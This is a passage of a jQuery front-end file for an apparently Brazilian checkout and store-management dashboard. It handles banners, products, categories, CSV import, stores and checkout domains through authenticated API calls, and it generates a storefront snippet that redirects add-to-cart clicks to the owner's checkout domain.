                                                $("<i>", {
                                                    class: "ni ni-bold-left",
                                                    style: "margin: 4px;",
                                                })
                                            )
                                        )
                                        .append(
                                            $("<select>", {
                                                class: "form-control",
                                                style: "width: 150px; height: 41px; margin-top: 10px;",
                                            }).append(
                                                $("<option>", {
                                                    value: 1,
                                                    text: "Tema Dropmeta",
                                                })
                                            )
                                        )
                                )
                                .append(
                                    $("<div>", {
                                        class: "code-editor",
                                    }).append(
                                        $("<pre>").append(
                                            $("<code>", {
                                                id: "code",
                                                class: "javascript",
                                                text:
                                                    _dados.dominio == null
                                                        ? "Não há domínio p/ checkout cadastrado."
                                                        : `$(document).ready(function(){
$('[action="/cart/add"]').contents().unwrap();
$('[data-action="add-to-cart"]').each((i,v)=>{
    $(v).click(function(e){
        e.preventDefault();
        let v = "";
        let p = ${dados.id_produto};
        let q = $('[name="quantity"]').val()??1;
        let l = ${idloja};

        $(".product-form__option-name").each((_i,_v)=>{
            v += $(_v).text() + "|"
        })

        location.href = "https://${_dados.dominio}/carrinho?p=" + p + "&q=" + q + "&l=" + l + "&v=" + v;
    })
})
})`,
                                            })
                                        )
                                    )
                                )
                        );
                });
        },
        bannerLoja() {
            $(".btnbanner").click(function (e) {
                e.preventDefault();
                let loja = $(this).attr("loja");
                let nBanner = $(this).attr("banner");
                const usuario = _global.getUsuario();
                var formData = new FormData();
                let bannerDesktop = $(
                    "#banner" + nBanner + "_desktop_" + loja
                )[0].files[0];
                let bannerMobile = $("#banner" + nBanner + "_mobile_" + loja)[0]
                    .files[0];
                let _this = $(this);

                formData.append("banner_desktop", bannerDesktop);
                formData.append("banner_mobile", bannerMobile);
                formData.append("id_loja", loja);
                formData.append("n", nBanner);

                if (bannerDesktop == undefined) {
                    _global.toast(
                        "É necessário inserir uma imagem para desktop.",
                        "toastwarning"
                    );
                    return;
                }
                if (bannerMobile == undefined) {
                    _global.toast(
                        "É necessário inserir uma imagem para mobile.",
                        "toastwarning"
                    );
                    return;
                }

                _global.btnCarregando($(_this), true, "Adicionar");

                $.ajax({
                    url: usuario.url_api + "dashboard/adicionarBannerLoja",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    headers: {
                        Accept: "application/json",
                        Authorization: "Bearer " + usuario.api_token,
                    },
                    success: function (retorno) {
                        if (retorno.status == 200) {
                            _global.toast(
                                "Os banners foram salvos com sucesso.",
                                "toastsucesso"
                            );
                        }
                        if (retorno.status == 500) {
                            _global.toast(
                                "Não foi possível salvar os banners",
                                "toasterro"
                            );
                        }
                        _global.btnCarregando($(_this), false, "Adicionar");
                    },
                    error: function (jqXHR, textStatus, errorThrown) {},
                });
            });
        },
        adicionarVariacao(idloja) {
            //todo
        },
        adicionarProdutosManual(idloja) {
            $("#add_produto_" + idloja).click(function (e) {
                e.stopPropagation();
                e.stopImmediatePropagation();
                e.stopPropagation();

                let produto = $("#nome_produto_" + idloja).val();
                let preco = $("#preco_produto_" + idloja).val() * 1;

                if (produto.length < 1) {
                    _global.toast(
                        "É necessário informar o nome do produto!",
                        "toastwarning"
                    );
                    return;
                }
                if (preco.length < 1 || isNaN(preco)) {
                    _global.toast(
                        "É necessário informar o preço do produto!",
                        "toastwarning"
                    );
                    return;
                }

                if ($("#img_produto_1_" + idloja)[0].files[0] == undefined) {
                    _global.toast(
                        "É necessário carregar pelo menos uma imagem para o produto!",
                        "toastwarning"
                    );
                    return;
                }

                _global.btnCarregando($(this), true, "Adicionar Produto");

                let _quill = $("#quill_" + idloja).children()[0];
                _quill = $(_quill).html();

                let _this = $(this);

                const usuario = _global.getUsuario();
                var formData = new FormData();
                console.log($("#img_produto_1_" + idloja)[0].files[0]);
                formData.append(
                    "imagem1",
                    $("#img_produto_1_" + idloja)[0].files[0]
                );
                formData.append(
                    "imagem2",
                    $("#img_produto_2_" + idloja)[0].files[0]
                );
                formData.append(
                    "imagem3",
                    $("#img_produto_3_" + idloja)[0].files[0]
                );
                formData.append(
                    "imagem4",
                    $("#img_produto_4_" + idloja)[0].files[0]
                );
                formData.append(
                    "imagem5",
                    $("#img_produto_5_" + idloja)[0].files[0]
                );
                formData.append(
                    "imagem6",
                    $("#img_produto_6_" + idloja)[0].files[0]
                );
                formData.append("id_loja", idloja);
                formData.append("id_usuario", usuario.id_usuario);
                formData.append("tipo_usuario", usuario.tipo_usuario);
                formData.append("descricao", _quill);
                formData.append("titulo", produto);
                formData.append("preco", preco);

                $.ajax({
                    url: usuario.url_api + "dashboard/adicionarProdutoManual",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    headers: {
                        Accept: "application/json",
                        Authorization: "Bearer " + usuario.api_token,
                    },
                    success: function (retorno) {
                        if (retorno.status == 200) {
                            _global.toast(retorno.mensagem, "toastsucesso");
                            _global.minhasLojas();
                            setTimeout(() => {
                                $("#img_produto_6_" + idloja).val("");
                                $("#img_produto_5_" + idloja).val("");
                                $("#img_produto_4_" + idloja).val("");
                                $("#img_produto_3_" + idloja).val("");
                                $("#img_produto_2_" + idloja).val("");
                                $("#img_produto_1_" + idloja).val("");
                                $("#nome_produto_" + idloja).val("");
                                $("#preco_produto_" + idloja).val("");
                                _global.btnCarregando(
                                    _this,
                                    false,
                                    "Adicionar Produto"
                                );
                                $("#div_voltar_produtos_" + idloja).click();
                            }, 1000);
                        }
                        if (retorno.status == 500) {
                            _global.toast(retorno.mensagem, "toasterro");
                            _global.btnCarregando(
                                _this,
                                false,
                                "Adicionar Produto"
                            );
                        }
                    },
                    error: function (jqXHR, textStatus, errorThrown) {
                        _global.btnCarregando(
                            _this,
                            false,
                            "Adicionar Produto"
                        );
                        _global.toast(retorno.mensagem, "toasterro");
                    },
                });
            });
        },
        geraQuillProduto(idloja) {
            $("#quill_produtos_loja_" + idloja).empty();
            $("#quill_produtos_loja_" + idloja).append(
                $("<div>", {
                    id: "quill_" + idloja,
                })
            );
            objQuill[idloja] = new Quill("#quill_" + idloja, {
                theme: "snow",
            });
        },
        setAbaProdutos(idloja) {
            const usuario = _global.getUsuario();
            $.ajax({
                url: usuario.url_api + "getProdutos",
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Accept: "application/json",
                    Authorization: "Bearer " + usuario.api_token,
                },
                data: {
                    id_loja: idloja,
                },
                success: (retorno) => {
                    var source = {
                        localdata: retorno,
                        datatype: "JSON",
                    };
                    var dataAdapter = new $.jqx.dataAdapter(source, {
                        loadComplete: function (data) {},
                        loadError: function (xhr, status, error) {},
                    });

                    var getLocalization = function () {
                        var localizationobj = {};
                        localizationobj.emptydatastring =
                            "Nenhum produto encontrado para esta loja.";
                        localizationobj.loadtext = "Carregando...";
                        localizationobj.groupsheaderstring =
                            "Arraste uma coluna aqui para agrupar os dados retornados";
                        localizationobj.groupbystring =
                            "Agrupar por esta coluna";
                        localizationobj.groupremovestring =
                            "Remover do agrupamento";
                        localizationobj.decimalseparator = ",";
                        localizationobj.thousandsseparator = ".";
                        localizationobj.patterns = {
                            d: "d/M/yyyy",
                        };
                        return localizationobj;
                    };

                    $("#grid_produtos_" + idloja).jqxGrid({
                        source: dataAdapter,
                        statusbarheight: 45,
                        localization: getLocalization(),
                        selectionmode: "singlerow",
                        sortable: true,
                        filterable: true,
                        pageable: true,
                        showfilterrow: true,
                        showaggregates: true,
                        showstatusbar: true,
                        statusbarheight: 25,
                        editable: true,
                        width: "100%",
                        height: "100%",
                        theme: "fluent",
                        columns: [
                            {
                                text: "ID",
                                datafield: "id_produto",
                                hidden: false,
                                editable: false,
                                width: "7%",
                                align: "center",
                                cellsalign: "center",
                            },
                            {
                                text: "Produto",
                                datafield: "titulo",
                                width: "63%",
                                align: "center",
                                cellsalign: "center",
                            },
                            {
                                text: "Preço Atual",
                                datafield: "preco",
                                width: "15%",
                                align: "center",
                                cellsalign: "center",
                            },
                            {
                                text: "Preço Anterior",
                                datafield: "preco_anterior",
                                width: "15%",
                                align: "center",
                                cellsalign: "center",
                            },
                            {
                                text: "Loja",
                                datafield: "sn_loja",
                                width: "7%",
                                columntype: "checkbox",
                                align: "center",
                                cellsalign: "center",
                            },
                        ],
                    });

                    $("#grid_produtos_" + idloja).on(
                        "cellendedit",
                        function (event) {
                            event.stopPropagation();
                            event.preventDefault();
                            event.stopImmediatePropagation();
                            var args = event.args;
                            var row = args.row;
                            var oldvalue = args.oldvalue;
                            var newvalue = args.value;
                            var datafield = event.args.datafield;

                            if (datafield == "sn_loja") {
                                $.ajax({
                                    url: usuario.url_api + "updateSnLoja",
                                    method: "POST",
                                    headers: {
                                        "Content-Type":
                                            "application/x-www-form-urlencoded",
                                        Accept: "application/json",
                                        Authorization:
                                            "Bearer " + usuario.api_token,
                                    },
                                    data: {
                                        usuario: usuario.id_usuario,
                                        loja: idloja,
                                        valor: newvalue,
                                        id_produto: row.id_produto,
                                    },
                                    success: (retorno) => {
                                        if (retorno.status == 200) {
                                            _global.toast(
                                                "O produto foi " +
                                                    (newvalue == true
                                                        ? "ativado"
                                                        : "desativado") +
                                                    " com sucesso em sua loja",
                                                "toastsucesso"
                                            );
                                            _global.setAbaLojaModal(idloja);
                                        } else {
                                            _global.toast(
                                                "Não foi possível " +
                                                    (newvalue == true
                                                        ? "ativar"
                                                        : "desativar") +
                                                    " o produto em sua loja"
                                            );
                                        }
                                        return;
                                    },
                                });
                                return;
                            }

                            if (oldvalue == newvalue) {
                                return;
                            }
                            let campo;
                            let preco;

                            if (datafield == "preco") {
                                preco = parseFloat(newvalue);

                                if (isNaN(preco)) {
                                    _global.toast(
                                        "Digite um valor númerico para o preço do produto",
                                        "toasterro"
                                    );
                                    row.preco = oldvalue;
                                    return;
                                } else {
                                    newvalue = newvalue.replace(",", ".");
                                    campo = "preco";
                                }
                            } else if (datafield == "preco_anterior") {
                                preco = parseFloat(newvalue);

                                if (isNaN(preco)) {
                                    _global.toast(
                                        "Digite um valor númerico para o preço do produto",
                                        "toasterro"
                                    );
                                    row.preco = oldvalue;
                                    return;
                                } else {
                                    newvalue = newvalue.replace(",", ".");
                                    campo = "preco_anterior";
                                }
                            }

                            if (datafield == "titulo") {
                                campo = "titulo";
                            }
                            $.ajax({
                                url: usuario.url_api + "updateProduto",
                                method: "POST",
                                headers: {
                                    "Content-Type":
                                        "application/x-www-form-urlencoded",
                                    Accept: "application/json",
                                    Authorization:
                                        "Bearer " + usuario.api_token,
                                },
                                data: {
                                    campo: campo,
                                    usuario: usuario.id_usuario,
                                    loja: idloja,
                                    valor: newvalue,
                                    id_produto: row.id_produto,
                                },
                                success: (retorno) => {
                                    if (retorno.status == 200) {
                                        _global.toast(
                                            (campo == "preco_anterior"
                                                ? "O preço anterior"
                                                : campo) +
                                                " foi atualizado com sucesso!",
                                            "toastsucesso"
                                        );
                                        if (campo == "titulo") {
                                            row.titulo = newvalue;
                                        } else if (campo == "preco_anterior") {
                                            row.preco_anterior = newvalue;
                                        } else {
                                            row.preco = newvalue;
                                        }
                                        $("#grid_produtos_" + idloja).jqxGrid(
                                            "updaterow",
                                            row.boundindex,
                                            row
                                        );
                                    } else if (retorno.status == 401) {
                                        _global.toast(
                                            "Não foi possível atualizar: " +
                                                campo,
                                            "toasterro"
                                        );
                                        if (campo == "titulo") {
                                            row.titulo = oldvalue;
                                        } else if (campo == "preco_anterior") {
                                            row.preco_anterior = oldvalue;
                                        } else {
                                            row.preco = oldvalue;
                                        }
                                        $("#grid_produtos_" + idloja).jqxGrid(
                                            "updaterow",
                                            row.boundindex,
                                            row
                                        );
                                    }
                                },
                                error: () => {
                                    _global.toast(
                                        "Houve um erro interno ao salvar.",
                                        "toasterro"
                                    );
                                },
                            });
                        }
                    );

                    $("#deleta_produto_" + idloja).on("click", function (e) {
                        e.stopImmediatePropagation();
                        e.preventDefault();
                        e.stopPropagation();
                        let loja = $(this).attr("loja");
                        var row = $("#grid_produtos_" + loja).jqxGrid(
                            "getselectedrowindex"
                        );
                        var data = $("#grid_produtos_" + loja).jqxGrid(
                            "getrowdata",
                            row
                        );

                        if (data == undefined || row == -1) {
                            _global.toast(
                                "Selecione um produto na tabela.",
                                "toasterro"
                            );
                            return;
                        }
                        $(this).prop("disabled", true);
                        let this_ = $(this);

                        $.ajax({
                            url: usuario.url_api + "deleteProduto",
                            method: "POST",
                            headers: {
                                "Content-Type":
                                    "application/x-www-form-urlencoded",
                                Accept: "application/json",
                                Authorization: "Bearer " + usuario.api_token,
                            },
                            data: {
                                id_loja: loja,
                                id_produto: data.id_produto,
                                usuario: usuario.id_usuario,
                            },
                            success: (retorno) => {
                                if (retorno.status == 200) {
                                    _global.toast(
                                        "O produto foi deletado com sucesso",
                                        "toastsucesso"
                                    );
                                    $("#grid_produtos_" + loja).jqxGrid(
                                        "deleterow",
                                        data.uid
                                    );
                                } else if (retorno.status == 401) {
                                    _global.toast(
                                        "Não foi possível deletar o produto",
                                        "toasterro"
                                    );
                                }
                                $(this).prop("disabled", false);
                            },
                            error: () => {
                                $(this).prop("disabled", false);
                                _global.toast("Erro interno", "toasterro");
                            },
                        });
                    });

                    $("#importa_csv_loja_" + idloja).on("click", function (e) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        let thisbotao = $(this);
                        if (
                            $("#csv_loja_" + idloja).val() == "" ||
                            $("#csv_loja_" + idloja).val() < 1
                        ) {
                            _global.toast(
                                "Carregue um arquivo para importar!",
                                "toastwarning"
                            );
                            return;
                        }

                        let csv_valor = $("#csv_loja_" + idloja).val();
                        csv_valor = csv_valor.split(".");

                        if (csv_valor[1] != "csv") {
                            _global.toast(
                                "São aceitos somente arquivos com extensão .csv",
                                "toasterro"
                            );
                            return;
                        }
                        $(this).text("");
                        $(this).removeClass("btn-primary");
                        $(this).addClass("btn-success");
                        $(this).prop("disabled", true);
                        $(this).append(
                            $("<div>", {
                                class: "spinner-border text-white",
                                role: "status",
                                style: "width: 20px; height: 20px;",
                            })
                        );

                        const usuario = _global.getUsuario();
                        var formData = new FormData();
                        formData.append(
                            "csv",
                            $("#csv_loja_" + idloja)[0].files[0]
                        );
                        formData.append("id_loja", idloja);
                        formData.append("id_usuario", usuario.id_usuario);
                        formData.append("tipo_usuario", usuario.tipo_usuario);

                        $.ajax({
                            url: usuario.url_api + "importarCsv",
                            type: "POST",
                            data: formData,
                            processData: false,
                            contentType: false,
                            headers: {
                                Accept: "application/json",
                                Authorization: "Bearer " + usuario.api_token,
                            },
                            success: function (retorno) {
                                if (retorno.status == 200) {
                                    _global.toast(
                                        retorno.mensagem,
                                        "toastsucesso"
                                    );
                                    _global.minhasLojas();
                                }
                                if (retorno.status == 401) {
                                    _global.toast(
                                        retorno.mensagem,
                                        "toasterro"
                                    );
                                }
                                $(thisbotao).prop("disabled", false);
                                $(thisbotao).empty();
                                $(thisbotao).removeClass("btn-success");
                                $(thisbotao).addClass("btn-primary");
                                $(thisbotao).text("Importar");
                            },
                            error: function (jqXHR, textStatus, errorThrown) {
                                _global.toast(retorno.mensagem, "toasterro");
                            },
                        });
                    });
                },
            });

            $("#adiciona_produto_" + idloja).click(function (e) {
                e.preventDefault();
                e.stopImmediatePropagation();
                e.stopPropagation();

                $("#grid_produtos_" + idloja).hide();
                $("#grid_produtos_" + idloja).hide();
                $("#div_adicionar_produto_" + idloja).hide();
                $("#div_adicionar_produto_form_" + idloja).show();
                $("#quill_produtos_loja_" + idloja).show();
                $("#divprodutomodal").removeClass("card");
            });

            $("#div_voltar_produtos_" + idloja).click(function (e) {
                e.preventDefault();
                e.stopImmediatePropagation();
                e.stopPropagation();

                $("#grid_produtos_" + idloja).show();
                $("#div_adicionar_produto_" + idloja).show();
                $("#div_adicionar_produto_form_" + idloja).hide();
                $("#quill_produtos_loja_" + idloja).hide();
                $("#divprodutomodal").addClass("card");
            });
        },
        btnCarregando(botao, carregando, textoBotao = "Adicionar") {
            if (carregando == true) {
                $(botao).text("");
                $(botao).removeClass("btn-primary");
                $(botao).addClass("btn-success");
                $(botao).append(
                    $("<div>", {
                        class: "spinner-border text-white",
                        role: "status",
                        style: "width: 20px; height: 20px;",
                    })
                );
                $(botao).prop("disabled", true);
            } else {
                $(botao).removeClass("btn-success");
                $(botao).addClass("btn-primary");
                $(botao).text(textoBotao);
                $(botao).prop("disabled", false);
            }
        },
        setAbaLojaModal(idloja) {
            const usuario = _global.getUsuario();
            let produtos;
            let listacategorias;

            const gridProdutos = async function () {
                return new Promise((res) => {
                    $.ajax({
                        url: usuario.url_api + "getProdutosLoja",
                        method: "POST",
                        headers: {
                            "Content-Type": "application/x-www-form-urlencoded",
                            Accept: "application/json",
                            Authorization: "Bearer " + usuario.api_token,
                        },
                        data: {
                            id_loja: idloja,
                        },
                        success: (retorno) => {
                            produtos = retorno;

                            var source = {
                                localdata: retorno,
                                datatype: "JSON",
                            };
                            var dataAdapter = new $.jqx.dataAdapter(source, {
                                loadComplete: function (data) {},
                                loadError: function (xhr, status, error) {},
                            });

                            var getLocalization = function () {
                                var localizationobj = {};
                                localizationobj.emptydatastring =
                                    "Nenhum produto encontrado para esta loja.";
                                localizationobj.loadtext = "Carregando...";
                                localizationobj.groupsheaderstring =
                                    "Arraste uma coluna aqui para agrupar os dados retornados";
                                localizationobj.groupbystring =
                                    "Agrupar por esta coluna";
                                localizationobj.groupremovestring =
                                    "Remover do agrupamento";
                                localizationobj.decimalseparator = ",";
                                localizationobj.thousandsseparator = ".";
                                localizationobj.patterns = {
                                    d: "d/M/yyyy",
                                };
                                return localizationobj;
                            };

                            $("#grid_produtos_loja_" + idloja).jqxGrid({
                                source: dataAdapter,
                                statusbarheight: 45,
                                localization: getLocalization(),
                                selectionmode: "singlerow",
                                sortable: true,
                                filterable: true,
                                pageable: true,
                                showfilterrow: true,
                                showaggregates: true,
                                showstatusbar: true,
                                statusbarheight: 25,
                                editable: false,
                                height: "100%",
                                width: "100%",
                                theme: "fluent",
                                columns: [
                                    {
                                        text: "ID",
                                        datafield: "id_produto",
                                        editable: false,
                                        width: "5%",
                                        align: "center",
                                        cellsalign: "center",
                                    },
                                    {
                                        text: "Produto",
                                        datafield: "titulo",
                                        width: "60%",
                                        align: "center",
                                        cellsalign: "center",
                                    },
                                    {
                                        text: "Categoria",
                                        datafield: "ds_categoria",
                                        width: "20%",
                                        align: "center",
                                        cellsalign: "center",
                                    },
                                    {
                                        text: "Preço",
                                        datafield: "preco",
                                        width: "10%",
                                        align: "center",
                                        cellsalign: "center",
                                    },
                                    {
                                        text: "Ativo",
                                        datafield: "sn_loja",
                                        width: "5%",
                                        columntype: "checkbox",
                                        align: "center",
                                        cellsalign: "center",
                                    },
                                ],
                            });

                            $("#grid_produtos_loja_" + idloja).on(
                                "rowselect",
                                function (event) {
                                    var args = event.args;
                                    var rowBoundIndex = args.rowindex;
                                    var rowData = args.row;
                                    var produto = rowData.id_produto;

                                    const pai = $(
                                        "#select_prod_categoria_" + idloja
                                    ).parent();
                                    $(
                                        "#select_prod_categoria_" + idloja
                                    ).remove();
                                    $(pai).append(
                                        '<select style="width: 300px; height: 90%; margin-top: 2px; margin-left: 20px;" id="select_prod_categoria_' +
                                            idloja +
                                            '" class="form-control"></select>'
                                    );
                                    $(
                                        "#select_prod_categoria_" + idloja
                                    ).append(
                                        $("<option>", {
                                            value: "-1",
                                            text: "Selecione uma categoria",
                                        })
                                    );
                                    $(listacategorias).each((index, data) => {
                                        $(
                                            "#select_prod_categoria_" + idloja
                                        ).append(
                                            $("<option>", {
                                                value: data.id_produto_categoria,
                                                text: data.ds_categoria,
                                            })
                                        );
                                    });

                                    $(
                                        "#select_prod_categoria_" + idloja
                                    ).change(function (e) {
                                        e.stopImmediatePropagation();
                                        e.preventDefault();
                                        e.stopPropagation();
                                        var args = event.args;
                                        var rowBoundIndex = args.rowindex;
                                        var rowData = args.row;
                                        var produto = rowData.id_produto;

                                        let thisselect = $(this);
                                        let valor = $(this).val();
                                        let texto = $(
                                            "#select_prod_categoria_" +
                                                idloja +
                                                " option:selected"
                                        ).text();
                                        if (rowData.ds_categoria == texto) {
                                            _global.toast(
                                                "Selecione uma categoria diferente da atual.",
                                                "toastwarning"
                                            );
                                            return;
                                        }
                                        if (valor == "-1") {
                                            _global.toast(
                                                "Selecione uma categoria.",
                                                "toastwarning"
                                            );
                                            return;
                                        }

                                        $(this).prop("disabled", true);
                                        $.ajax({
                                            url:
                                                usuario.url_api +
                                                "updateCategoriaProduto",
                                            method: "POST",
                                            headers: {
                                                "Content-Type":
                                                    "application/x-www-form-urlencoded",
                                                Accept: "application/json",
                                                Authorization:
                                                    "Bearer " +
                                                    usuario.api_token,
                                            },
                                            data: {
                                                id_loja: idloja,
                                                id_produto: produto,
                                                usuario: usuario.id_usuario,
                                                categoria: valor,
                                            },
                                            success: (retorno) => {
                                                if (retorno.status == 200) {
                                                    rowData.ds_categoria =
                                                        texto;
                                                    $(
                                                        "#grid_produtos_loja_" +
                                                            idloja
                                                    ).jqxGrid(
                                                        "updaterow",
                                                        rowData.boundindex,
                                                        rowData
                                                    );

                                                    _global.toast(
                                                        "A categoria do produto foi atualizada com sucesso.",
                                                        "toastsucesso"
                                                    );
                                                } else {
                                                    _global.toast(
                                                        "Não foi possível atualizar a categoria do produto",
                                                        "toasterro"
                                                    );
                                                }
                                                $(thisselect).prop(
                                                    "disabled",
                                                    false
                                                );
                                            },
                                            error: () => {
                                                _global.toast(
                                                    "Erro interno",
                                                    "toasterro"
                                                );
                                            },
                                        });
                                    });
                                }
                            );
                        },
                    });
                });
            };

            const getCategorias = async function () {
                return new Promise((res) => {
                    $.ajax({
                        url: usuario.url_api + "getCategorias",
                        method: "POST",
                        headers: {
                            "Content-Type": "application/x-www-form-urlencoded",
                            Accept: "application/json",
                            Authorization: "Bearer " + usuario.api_token,
                        },
                        data: {
                            id_loja: idloja,
                        },
                        success: (retorno) => {
                            listacategorias = retorno.categoria;
                            res();
                            $("#categorias_produto_" + idloja).empty();
                            $(listacategorias).each((i, valor) => {
                                $("#categorias_produto_" + idloja).append(
                                    $("<option>", {
                                        value: valor.id_produto_categoria,
                                        text: valor.ds_categoria,
                                    })
                                );
                            });

                            $("#deleta_categoria_" + idloja).click(function (
                                e
                            ) {
                                e.preventDefault();
                                e.stopImmediatePropagation();
                                e.stopPropagation();

                                let thisdelete = $(this);
                                let valorDelete = $(
                                    "#categorias_produto_" + idloja
                                ).val();
                                if (valorDelete == null || valorDelete == "") {
                                    _global.toast(
                                        "Selecione uma categoria para deletar!",
                                        "toastwarning"
                                    );
                                    return;
                                }
                                _global.btnCarregando(
                                    $(this),
                                    true,
                                    "Deletar categoria"
                                );

                                $.ajax({
                                    url: usuario.url_api + "deleteCategoria",
                                    method: "POST",
                                    headers: {
                                        "Content-Type":
                                            "application/x-www-form-urlencoded",
                                        Accept: "application/json",
                                        Authorization:
                                            "Bearer " + usuario.api_token,
                                    },
                                    data: {
                                        id_loja: idloja,
                                        id_categoria: valorDelete,
                                    },
                                    success: (retorno) => {
                                        if (retorno.status == 200) {
                                            _global.toast(
                                                "A categoria foi deletada com sucesso!",
                                                "toastsucesso"
                                            );
                                            $(
                                                "#categorias_produto_" +
                                                    idloja +
                                                    ' option[value="' +
                                                    valorDelete +
                                                    '"]'
                                            ).remove();
                                        } else {
                                            _global.toast(
                                                "Não foi possível deletar a categoria",
                                                "toasterro"
                                            );
                                        }
                                        _global.btnCarregando(
                                            $(thisdelete),
                                            false,
                                            "Deletar Categoria"
                                        );
                                    },
                                    error: () => {
                                        _global.toast(
                                            "Erro interno.",
                                            "toasterro"
                                        );
                                        _global.btnCarregando(
                                            $(thisdelete),
                                            false,
                                            "Deletar Categoria"
                                        );
                                    },
                                });
                            });
                        },
                    });
                });
            };

            getCategorias().then(() => {
                gridProdutos();
            });

            $("#btn_categoria_" + idloja).click(function (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
                let thisbotao = $(this);

                if (
                    $("#add_categoria_" + idloja).val() == "" ||
                    $("#add_categoria_" + idloja).val().length == 0
                ) {
                    _global.toast(
                        "Digite uma categoria para adicionar",
                        "toastwarning"
                    );
                    return;
                }
                _global.btnCarregando(thisbotao, true, "Adicionar Categoria");

                $.ajax({
                    url: usuario.url_api + "adicionaCategoria",
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Accept: "application/json",
                        Authorization: "Bearer " + usuario.api_token,
                    },
                    data: {
                        id_loja: idloja,
                        categoria: $("#add_categoria_" + idloja).val(),
                    },
                    success: (retorno) => {
                        if (retorno.status == 200) {
                            _global.toast(
                                "A categoria foi adicionada com sucesso.",
                                "toastsucesso"
                            );
                            // $("#categorias_produto_" + idloja).append(
                            //     $("<option>", {
                            //         value: retorno.id,
                            //         text: retorno.ds
                            //     })
                            // )
                            _global.setAbaLojaModal(idloja);
                        } else {
                            _global.toast(
                                "Não foi possível adicionar a categoria.",
                                "toasterro"
                            );
                        }
                        _global.btnCarregando(
                            thisbotao,
                            false,
                            "Adicionar Categoria"
                        );
                    },
                    error: () => {
                        _global.toast("Erro interno", "toasterro");
                        _global.btnCarregando(
                            thisbotao,
                            false,
                            "Adicionar Categoria"
                        );
                    },
                });
            });
        },
        trocaAbaModalLoja(idloja) {
            $(".abamodalloja_" + idloja).click(function (e) {
                e.stopPropagation();
                e.preventDefault();

                let selected_aba = $(this).attr("aba");
                $("#pai_modal_" + idloja)
                    .children()
                    .each((index, data) => {
                        if ($(data).attr("aba") != selected_aba) {
                            $("#div" + $(data).attr("aba")).hide();
                            $(data).removeClass("activemodal");
                        } else {
                            $(data).addClass("activemodal");
                            $("#div" + $(data).attr("aba")).show();
                        }
                    });
            });
        },
        adicionaLoja: () => {
            $("#add_loja").click(function () {
                if ($("#nome_loja_input").val() < 1) {
                    _global.toast("Digite o nome da loja.", "toastwarning");
                    return;
                }

                $(this).text("");
                $(this).removeClass("btn-primary");
                $(this).addClass("btn-success");
                $(this).append(
                    $("<div>", {
                        class: "spinner-border text-white",
                        role: "status",
                        style: "width: 20px; height: 20px;",
                    })
                );

                const usuario = _global.getUsuario();

                $.ajax({
                    url: usuario.url_api + "adicionaLoja",
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Accept: "application/json",
                        Authorization: "Bearer " + usuario.api_token,
                    },
                    data: {
                        token: usuario.token_checkout,
                        tipo_checkout: $("#select_tipo_checkout").val(),
                        tipo_usuario: usuario.tipo_usuario,
                        id_usuario: usuario.id_usuario,
                        nome_loja: $("#nome_loja_input").val(),
                    },
                    success: (retorno) => {
                        if (retorno.status == 200) {
                            _global.toast(retorno.mensagem, "toastsucesso");
                            _global.selectAbaCheckout(usuario);
                            _global.getCards();
                            _global.minhasLojas();
                            _global.configWhatsapp();
                            _global.getLojasEmail();
                        } else {
                            _global.toast(retorno.mensagem, "toasterro");
                        }
                        $("#add_loja").empty();
                        $(this).removeClass("btn-success");
                        $(this).addClass("btn-primary");
                        $(this).text("Adicionar");
                    },
                });
            });
        },
        async selects() {
            const usuario = _global.dados_usuario;
            //select layouts - add loja
            let select = "";
            $.ajax({
                url: usuario.url_api + "layoutsLoja",
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Accept: "application/json",
                    Authorization: "Bearer " + usuario.api_token,
                },
                data: {
                    token: usuario.token_checkout,
                },
                success: (retorno, xhr) => {
                    retorno.forEach((v, i) => {
                        select +=
                            "<option value='" +
                            v.codigo +
                            "'>" +
                            v.descricao +
                            "</option>";
                    });

                    if (
                        usuario.usuario == "dev" ||
                        usuario.usuario == "dv" ||
                        usuario.usuario == "ot2"
                    ) {
                        select +=
                            '<option value="4">SkyPayments - Somente Suitpay</option>';
                    }
                },

                complete: () => {
                    _global.optionSelectLayout = select;
                    $("#select_tipo_checkout").append(select);
                },
            });
        },
        adicionarDominio() {
            const usuario = _global.getUsuario();
            _global.loadingAba("config_dominios", true);
            $("#checkbox_tipodominio").change(function (e) {
                let texto_checkbox = $("#text_checkbox_dominio");

                if ($(this).is(":checked")) {
                    $(texto_checkbox).text("Domínio será usado em Checkout");
                    $("#select_loja_dominio").prop("disabled", true);
                } else {
                    $(texto_checkbox).text("Domínio será usado em Loja");
                    $("#select_loja_dominio").prop("disabled", false);
                }
            });

            $.ajax({
                url: usuario.url_api + "dominio/getLojas",
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Accept: "application/json",
                    Authorization: "Bearer " + usuario.api_token,
                },
                data: {
                    tipo_usuario: usuario.tipo_usuario,
                    id_usuario: usuario.id_usuario,
                },
                success: (retorno) => {
                    $(retorno).each((i, valor) => {
                        $("#select_loja_dominio").append(
                            $("<option>", {
                                value: valor.id_loja,
                                text: valor.nm_loja,
                            })
                        );
                    });
                },
                complete: () => {
                    setTimeout(() => {
                        _global.loadingAba("config_dominios", false);
                    }, 500);
                },
            });

            $("#btnAdicionarDominio").click(function (e) {
                e.preventDefault();
                e.stopImmediatePropagation();
                e.stopPropagation();
                const dominio = $("#inputAdicionarDominio").val();
                const tp_dominio = "checkout";

                if (!dominio.includes(".")) {
                    _global.toast("Domínio inválido.", "toastwarning");
                    return;
                }
                if (dominio.length == 0 || dominio == "") {
                    _global.toast(
                        "É necessário informar o domínio.",
                        "toastwarning"
                    );
                    return;
                }
                if (!$("#checkboxAdicionarDominio").prop("checked")) {
                    _global.toast(
                        "Você precisar concordar com as condições.",
                        "toastwarning"
                    );
                    return;
                }
                if (
                    tp_dominio == "loja" &&
                    $("#select_loja_dominio").val() == ""
                ) {
                    _global.toast(
                        "Selecione uma loja para adicionar ao domínio.",
                        "toastwarning"
                    );
                    return;
                }

                _global.btnCarregando($(this), true, "Adicionar");

                $.ajax({
                    url: usuario.url_api + "adicionarDominio",
                    method: "POST",
                    headers: {
